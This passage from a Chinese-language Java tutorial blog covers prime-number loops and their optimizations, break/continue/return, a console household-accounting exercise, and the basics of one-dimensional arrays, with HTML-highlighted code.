&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>100以内的所有质数:   (2~n-1)不能整除n  （除了1，和他本身）</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrimeNumberTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> isFlag =<span class="keyword">true</span>; <span class="comment">//i是否被j除尽，一旦除尽。修改其值</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="number">100</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>;j&lt;=i-<span class="number">1</span><span class="comment">/*j&lt;=Math.sqrt(i) 优化二：根号i*/</span>;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i%j==<span class="number">0</span>)&#123;</span><br><span class="line">                    isFlag =<span class="keyword">false</span>;</span><br><span class="line">                    <span class="comment">//break; 优化一:只对本身非质数的自然数有效</span></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(isFlag)&#123;</span><br><span class="line">                System.out.print(i+<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            isFlag=<span class="keyword">true</span>; <span class="comment">//重置isFlag</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>优化二：j&lt;=Math.sqrt(i)：对本身是质数的自然数是有效的。</p>
<p>long start = System.currentTimeMillis();//获取当前时间距离1970-01-01 00:00:00的毫秒数  时间戳</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrimeNumberTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> isFlag =<span class="keyword">true</span>;  <span class="comment">//i是否被j除尽，一旦除尽。修改其值</span></span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();<span class="comment">//获取当前时间距离1970-01-01 00:00:00的毫秒数</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="number">100000</span>;i++)&#123;</span><br><span class="line">            <span class="comment">//优化二：j&lt;=Math.sqrt(i)</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>;j&lt;=Math.sqrt(i);j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i%j==<span class="number">0</span>)&#123;</span><br><span class="line">                    isFlag =<span class="keyword">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;<span class="comment">//优化1:只对本身非质数的自然数有效</span></span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(isFlag)&#123;</span><br><span class="line">                <span class="comment">//System.out.print(i+&quot; &quot;);</span></span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            isFlag=<span class="keyword">true</span>; <span class="comment">//重置isFlag</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;所花费的时间为：&quot;</span>+(end-start));</span><br><span class="line">        System.out.println(<span class="string">&quot;个数为：&quot;</span>+count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="break与continue关键字的使用"><a href="#break与continue关键字的使用" class="headerlink" title="break与continue关键字的使用"></a>break与continue关键字的使用</h4><p>break 使用在switch-case和循环结构中；结束当前循环，就近</p>
<p>continue：循环结构中；结束当次循环，就近</p>
<p>关键字后面不能声明执行语句</p>
<p>如果要结束指定循环：</p>
<p><img src="/2022/04/13/JAVA/image-20220418232951718.png" alt="image-20220418232951718"></p>
<h4 id="return-的使用"><a href="#return-的使用" class="headerlink" title="return 的使用"></a>return 的使用</h4><p>●return：并非专门用于结束循环的，它的功能是结束一个方法。当一个方法执行到一个return语句时，这个方法将被结束。<br>●与break和continue不同的是，return直接结束整个方法，不管这个return处于多少层循环之内</p>
<p>质数实现方式二：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PrimeNumberTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">long</span> start = System.currentTimeMillis();<span class="comment">//获取当前时间距离1970-01-01 00:00:00的毫秒数</span></span><br><span class="line">        </span><br><span class="line">       label:<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=<span class="number">100000</span>;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">2</span>;j&lt;=Math.sqrt(i);j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(i%j==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">continue</span> label;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">           <span class="comment">//执行到此步骤的都为质数</span></span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">long</span> end = System.currentTimeMillis();</span><br><span class="line">        System.out.println(<span class="string">&quot;所花费的时间为：&quot;</span>+(end-start));</span><br><span class="line">        System.out.println(<span class="string">&quot;个数为：&quot;</span>+count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="项目一"><a href="#项目一" class="headerlink" title="项目一"></a>项目一</h2><p>Utility.java工具类:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> familyaccount.demo;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Utility</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**Utility工具类：</span></span><br><span class="line"><span class="comment">     将不同的功能封装为方法，就是可以直接通过调用方法使用他的功能，而无须考虑具体的功能实现细节。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> Scanner scanner = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 用于界面菜单的选择，该方法读取键盘，如果用户输入1-4中的任意字符，则方法返回，返回值为用户键入字符</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">readMenuSelection</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">char</span> c;</span><br><span class="line">            <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">                String str = readKeyBoard(<span class="number">1</span>);</span><br><span class="line">                c = str.charAt(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span>(c !=<span class="string">&#x27;1&#x27;</span>&amp;&amp; c !=<span class="string">&#x27;2&#x27;</span> &amp;&amp; c !=<span class="string">&#x27;3&#x27;</span> &amp;&amp; c !=<span class="string">&#x27;4&#x27;</span>)&#123;</span><br><span class="line">                    System.out.print(<span class="string">&quot;选择错误，请重新输入：&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span> <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 用于收入支出金额的输入。该方法从键盘读取一个4位长度的整数，并将其作为方法的返回值</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">readNumber</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">int</span> n;</span><br><span class="line">            <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">                String str = readKeyBoard(<span class="number">4</span>);</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    n = Integer.parseInt(str);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (NumberFormatException e)&#123;</span><br><span class="line">                    System.out.print(<span class="string">&quot;数字输入错误，请重新输入：&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 用于收入支出说明的输入。该方法从键盘读取一个不超过8位长度的字符串，并将其作为方法的返回值</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readString</span><span class="params">()</span></span>&#123;</span><br><span class="line">            String str = readKeyBoard(<span class="number">8</span>);</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 用于收入支出说明确认选择的输入。该方法从键盘读取’Y‘或‘N’，并将其作为方法的返回值</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">char</span> <span class="title">readConfirmSelection</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">char</span> c;</span><br><span class="line">            <span class="keyword">for</span>(;;)&#123;</span><br><span class="line">                String str = readKeyBoard(<span class="number">1</span>).toUpperCase();</span><br><span class="line">                c = str.charAt(<span class="number">0</span>);</span><br><span class="line">                <span class="keyword">if</span>(c == <span class="string">&#x27;Y&#x27;</span>|| c == <span class="string">&#x27;N&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    System.out.print(<span class="string">&quot;选择错误，请重新输入：&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> c;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/** 用于键入用户输入，判断长度，并将返回用户输入*/</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> String <span class="title">readKeyBoard</span><span class="params">(<span class="keyword">int</span> limit)</span> </span>&#123;</span><br><span class="line">            String line = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (scanner.hasNext()) &#123;</span><br><span class="line">                line = scanner.nextLine();</span><br><span class="line">                <span class="keyword">if</span> (line.length() &lt; <span class="number">1</span> || line.length() &gt; limit) &#123;</span><br><span class="line">                    System.out.print(<span class="string">&quot;输入长度（不大于&quot;</span> + limit + <span class="string">&quot;）错误，请重新输入：&quot;</span>);</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> line;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>FamilyAccount.java</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> familyaccount.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FamilyAccount</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">boolean</span> isFlag = <span class="keyword">true</span>;</span><br><span class="line">            <span class="comment">//用于记录用户收入与支出详情</span></span><br><span class="line">            String details = <span class="string">&quot;收支\t账户金额\t收支金额\t说   明\n&quot;</span>;</span><br><span class="line">            <span class="comment">//初始金额</span></span><br><span class="line">            <span class="keyword">int</span> balance = <span class="number">10000</span>;</span><br><span class="line">            <span class="keyword">while</span> (isFlag)&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;-----------------家庭收支记账软件-----------------\n&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;                  1 收支明细&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;                  2 登记收入&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;                  3 登记支出&quot;</span>);</span><br><span class="line">                System.out.println(<span class="string">&quot;                  4 退   出\n&quot;</span>);</span><br><span class="line">                System.out.print(<span class="string">&quot;                  请选择(1-4):&quot;</span>);</span><br><span class="line">                <span class="comment">//获取用户的选择：1-4</span></span><br><span class="line">                <span class="keyword">char</span> selection = Utility.readMenuSelection();</span><br><span class="line">                <span class="keyword">switch</span>(selection)&#123;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">                        System.out.println(<span class="string">&quot;-----------------当前收支明细记录-----------------&quot;</span>);</span><br><span class="line">                        System.out.println(details);</span><br><span class="line">                        System.out.println(<span class="string">&quot;-----------------------------------------------\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">                        <span class="comment">//登记收入</span></span><br><span class="line">                        System.out.print(<span class="string">&quot;本次收入金额：&quot;</span>);</span><br><span class="line">                        <span class="keyword">int</span> addmoney = Utility.readNumber();</span><br><span class="line">                        System.out.print(<span class="string">&quot;本次收入说明：&quot;</span>);</span><br><span class="line">                        String addinfo = Utility.readString();</span><br><span class="line">                        <span class="comment">//处理balance</span></span><br><span class="line">                        balance += addmoney;</span><br><span class="line">                        <span class="comment">//处理details</span></span><br><span class="line">                        details += (<span class="string">&quot;收入\t&quot;</span>+ balance +<span class="string">&quot;\t&quot;</span> + addmoney +<span class="string">&quot;\t\t&quot;</span>+addinfo+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">&quot;--------------------登记完成--------------------\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:</span><br><span class="line">                        <span class="comment">//登记支出</span></span><br><span class="line">                        System.out.print(<span class="string">&quot;本次支出金额：&quot;</span>);</span><br><span class="line">                        <span class="keyword">int</span> submoney = Utility.readNumber();</span><br><span class="line">                        System.out.print(<span class="string">&quot;本次支出说明：&quot;</span>);</span><br><span class="line">                        String subinfo = Utility.readString();</span><br><span class="line">                        <span class="comment">//处理balance</span></span><br><span class="line">                        <span class="keyword">if</span>(balance&gt;=submoney)&#123;</span><br><span class="line">                            balance -= submoney;</span><br><span class="line">                            <span class="comment">//处理details</span></span><br><span class="line">                            details += (<span class="string">&quot;支出\t&quot;</span>+ balance +<span class="string">&quot;\t&quot;</span> + submoney +<span class="string">&quot;\t\t&quot;</span>+subinfo+<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                            System.out.println(<span class="string">&quot;支出超出账户额度，支付失败&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        System.out.println(<span class="string">&quot;--------------------登记完成--------------------\n&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:</span><br><span class="line">                        System.out.print(<span class="string">&quot;确认是否退出(Y/N):&quot;</span>);</span><br><span class="line">                        <span class="keyword">char</span> isExit = Utility.readConfirmSelection();</span><br><span class="line">                        <span class="keyword">if</span>(isExit == <span class="string">&#x27;Y&#x27;</span>)&#123;</span><br><span class="line">                            isFlag = <span class="keyword">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>1.数组的理解:数组(Array),是多个<strong>相同类型数据</strong>按一定顺序排列的集合， 并使用一个名字命名，并通过编号的方式对这些数据进行统一管理。</p>
<p>2.数组相关的概念:</p>
<blockquote>
<p>数组名<br>元素<br>角标、下标、索引<br>数组的长度：元素的个数</p>
</blockquote>
<p>3.数组的特点:</p>
<blockquote>
<p>1)数组是有序排列的<br>2)数组属于引用数据类型的变量。数组的元素，既可以是基本数据类型，也可以是引用数据类型<br>3)创建数组对象会在内存中开辟<strong>一整块连续</strong>的空间<br>4)数组的长度一旦确定， 就不能修改。</p>
</blockquote>
<p>4.数组的分类:<br>①按照维数:一维数组、二维数组…..<br>②按照数组元素的类型:基本数据类型元素的数组、引用数据类型元素的数组</p>
<h3 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h3><p>①一维数组的声明和初始化<br>②如何调用数组的指定位置的元素<br>③如何获取数组的长度<br>④如何遍历数组<br>⑤数组元素的默认初始化值<br>⑥数组的内存解析</p>
<p>一、一维数组的声明和初始化</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ids ;<span class="comment">//声明</span></span><br><span class="line">        <span class="comment">//1.1 静态初始化:数组的初始化和数组元素的赋值操作同时进行</span></span><br><span class="line">        ids = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1001</span>,<span class="number">1002</span>,<span class="number">1003</span>,<span class="number">1004</span>&#125;;<span class="comment">//中括号不填长度</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//1.2 动态初始化：数组的初始化和数组元素的赋值操作分开进行</span></span><br><span class="line">        String[] names = <span class="keyword">new</span> String[<span class="number">5</span>];<span class="comment">//这种方式中括号里必须指明长度</span></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结:数组一旦初始化完成，其长度就确定了。</p>
<p>二、元素的调用：通过角标的方式</p>
<p>数组的角标从0开始，到数组的长度-1结束。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ids ;<span class="comment">//声明</span></span><br><span class="line">        <span class="comment">//1.1 静态初始化:数组的初始化和数组元素的赋值操作同时进行</span></span><br><span class="line">        ids = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1001</span>,<span class="number">1002</span>,<span class="number">1003</span>,<span class="number">1004</span>&#125;;</span><br><span class="line">        <span class="comment">//1.2 动态初始化：数组的初始化和数组元素的赋值操作分开进行</span></span><br><span class="line">        String[] names = <span class="keyword">new</span> String[<span class="number">5</span>];<span class="comment">//这种方式中括号里必须指明长度</span></span><br><span class="line">        names[<span class="number">0</span>] = <span class="string">&quot;王0&quot;</span>;</span><br><span class="line">        names[<span class="number">1</span>] = <span class="string">&quot;王1&quot;</span>;</span><br><span class="line">        names[<span class="number">2</span>] = <span class="string">&quot;王2&quot;</span>;</span><br><span class="line">        names[<span class="number">3</span>] = <span class="string">&quot;王3&quot;</span>;</span><br><span class="line">        names[<span class="number">4</span>] = <span class="string">&quot;王4&quot;</span>;</span><br><span class="line">        System.out.println(names[<span class="number">0</span>].charAt(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">结果：王</span><br></pre></td></tr></table></figure>

<p>三、如何获取数组的长度</p>
<p>属性：length   数组名.length</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ids ;<span class="comment">//声明</span></span><br><span class="line">        <span class="comment">//1.1 静态初始化:数组的初始化和数组元素的赋值操作同时进行</span></span><br><span class="line">        ids = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1001</span>,<span class="number">1002</span>,<span class="number">1003</span>,<span class="number">1004</span>&#125;;</span><br><span class="line">        <span class="comment">//1.2 动态初始化：数组的初始化和数组元素的赋值操作分开进行</span></span><br><span class="line">        String[] names = <span class="keyword">new</span> String[<span class="number">5</span>];<span class="comment">//这种方式中括号里必须指明长度</span></span><br><span class="line">        System.out.println(names.length);</span><br><span class="line">        System.out.println(ids.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>四、如何遍历数组</p>
<p>for循环  i&lt;length</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cj.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArrayTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] ids ;<span class="comment">//声明</span></span><br><span class="line">        <span class="comment">//1.1 静态初始化:数组的初始化和数组元素的赋值操作同时进行</span></span><br><span class="line">        ids = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">1001</span>,<span class="number">1002</span>,<span class="number">1003</span>,<span class="number">1004</span>&#125;;</span><br><span class="line">        <span class="comment">//1.2 动态初始化：数组的初始化和数组元素的赋值操作分开进行</span></span><br><span class="line">        String[] names = <span class="keyword">new</span> String[<span class="number">5</span>];<span class="comment">//这种方式中括号里必须指明长度</span></span><br><span class="line">        System.out.println(names.length);</span><br><span class="line">        